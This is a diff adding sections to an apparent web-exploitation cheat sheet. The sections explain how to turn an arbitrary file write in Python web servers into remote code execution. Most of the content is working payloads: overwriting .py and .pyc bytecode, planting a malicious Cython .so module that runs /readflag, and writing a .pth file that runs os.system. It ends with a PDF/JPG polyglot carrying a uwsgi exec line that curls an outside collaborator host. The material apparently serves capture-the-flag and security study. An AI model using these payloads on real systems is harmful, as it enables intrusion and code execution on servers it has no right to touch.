@@ -303,3 +303,170 @@ class RequestHandler(BaseHTTPRequestHandler):
     setTimeout('document.forms[0].submit()',3000)
 </script>
 ```
+
+
+# .pyc files 
+
+
+- [CPython](https://peps.python.org/pep-3147/#case-0-the-steady-state) compiles its source code into “byte code”, and for performance reasons, it caches this byte code on the file system whenever the source file has changes.
+- This makes loading of Python modules much faster because the compilation phase can be bypassed.
+- When your source file is foo.py, CPython caches the byte code in a foo.pyc file right next to the source.
+- When a Python source file is imported for the first time, a __pycache__ directory will be created in the package directory, if one does not already exist.
+- Cached files are located in `__pycache__/foo.<magic>.pyc`
+    - It will be created at the first import of foo.py, after Python byte compiles it.
+    - Every other further import statement will load this pyc file instead of the .py file.
+    - But the .py needs to be always available in the filesystem , otherwise the .pyc will not load.
+
+
+### File structure
+
+- 4byte magic string
+    - Python version specific
+- 4byte [bitfield](https://peps.python.org/pep-0552/)
+- 4byte timestamp
+    - The timestamp is used to make sure that the pyc file match the py file that was used to create it.
+    - When either the magic number or timestamp do not match, the py file is recompiled and a new pyc file is written.
+- 4byte filesize
+- arbitary byte code from [marshalled](https://docs.python.org/3/library/marshal.html) python code.
+
+
+# Arbitary File Write In Python Webservers
+
+
+### overwriting .py file
+
+```python
+__import__("os").system("id > /tmp/pwned")
+```
+
+
+### overwriting .pyc file
+
+- An attacker can [overide](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/) a .pyc chace file inside `__pycache__`
+- Keep in mind that he first has to read that file, exfiltrate the header([or build it from sourcecode](https://qiita.com/tournip/items/90da8ff66d2113c08ce8#intended-approach)) and append it to  the new one in order for the python importer not to regenerate it.
+
+
+```python
+RCE_SOURCE_CODE = f'__import__("os").system("id > /app/uploads/{EXFILTRATED_FLAG_FILENAME}")'
+def modifyBytecode(bytecode):
+    headers = bytecode[0:16]
+    codeObject = compile(RCE_SOURCE_CODE, BYTECODE_FILENAME, 'exec')
+    codeBytes = marshal.dumps(codeObject)
+
+    newBytecode = magicNumber + bitField + modDate + sourceSize + codeBytes
+    return newBytecode
+```
+
+- If arbitary file read is not possible, an attacker must leak the information through the app
+
+- Py version is usually present in response headers
+- Change to that version with pyenv and execute:
+
+```python
+>>> import importlib.util
+>>> importlib.util.MAGIC_NUMBER
+b'\xa7\r\r\n'
+```
+
+
+### overwriting .so files
+
+- A file with .so extension is a library containing binary code to perform .so functions. The .so file allows more than one program to use the functions it stores at the same time.
+- They are cython-compiled versions of the .py files.
+
+- While looking for a module or package named “foo”, for each directory in the parent path:
+    - If `/foo/init.py` is found, a regular package is imported and returned.
+    - If not, but /foo.{py,pyc,so,pyd} is found, a module is imported and returned.
+    - Also foo.so will take precedence over foo.py
+- So an attacker can create a `<libname>.so` file, place it in same directory of the app as the original, and trigger the import
+
+- The file needs to be compiled in the same enviroment as the platform running the app.
+
+```python
+# setup.py
+from setuptools import setup
+from Cython.Build import cythonize
+
+with open('utils.pyx', 'w') as f:
+    f.write('''import os
+
+MAGIC = '%PDF-'
+def saveFile(filePath, fileContent):
+        os.system('/readflag > uploads/answer.txt')
+        with open(filePath, 'wb') as file:
+            file.write(fileContent)
+''')
+
+setup(
+    name="utils",
+    ext_modules=cythonize("utils.pyx"),
+)
+```
+
+```bash
+$python3 setup.py build_ext --inplace
+```
+
+- Or use [cythonize](https://cython.readthedocs.io/en/latest/src/userguide/source_files_and_compilation.html)
+
+```bash
+cythonize -i setup.py
+```
+
+
+### writing to .pth files
+
+-  [site-specific configuration hooks](https://docs.python.org/3/library/site.html) is a feature in python ,that is automatically included
+- It allows to add custom module search paths to a specific site/module.
+- That means that if you create a `.local/lib/pythonX.Y/site-packages/*.pth` file in your home directory, any path in there is going to be added to sys.path.
+- This path is relative to the [PYTHONUSERBASE](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONUSERBASE)
+env variable, so changing that you can place the .pth file accordingly.
+
+
+```bash
+$echo '/tmp' > ~/.local/lib/python3.10/site-packages/foo.pth
+$python3
+>>> import sys
+>>> sys.path
+[ ... '/tmp', ... ]
+```
+
+- In addition, a line starting with import in this file, [is inserted in an exec statement](https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/), so an attacker can have a possible RCE vector once a new Python process is spawned.
+
+```bash
+$echo 'import os;os.system("whoami>/tmp/x")' > .local/lib/python3.10/site-packages/arbitrary_name.pth
+```
+
+
+
+# Utilitys
+
+
+## Polyglots
+
+### Creating a pdf with retained text data
+
+- An attacker can create valid pdf formats to be [uploaded](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html) and also embed plaintext that will be retained and not get pdf-formated.
+- This means that if the pdf file is to treated as cleartext file, the plaitext embeded will be retrived as is.
+- In this example the data are embeded in metadata of a jpg file inside the pdf.
+
+```python
+    from fpdf import FPDF
+    from exiftool import ExifToolHelper
+
+    with ExifToolHelper() as et:
+        et.set_tags(
+            ["doyensec.jpg"],
+            tags={"model": "&#x0a;[uwsgi]&#x0a;foo = @(exec://curl http://collaborator-unique-host.oastify.com)&#x0a;"},
+            params=["-E", "-overwrite_original"]
+        )
+
+    class MyFPDF(FPDF):
+        pass
+
+    pdf = MyFPDF()
+
+    pdf.add_page()
+    pdf.image('./doyensec.jpg')
+    pdf.output('payload.pdf', 'F')
+```
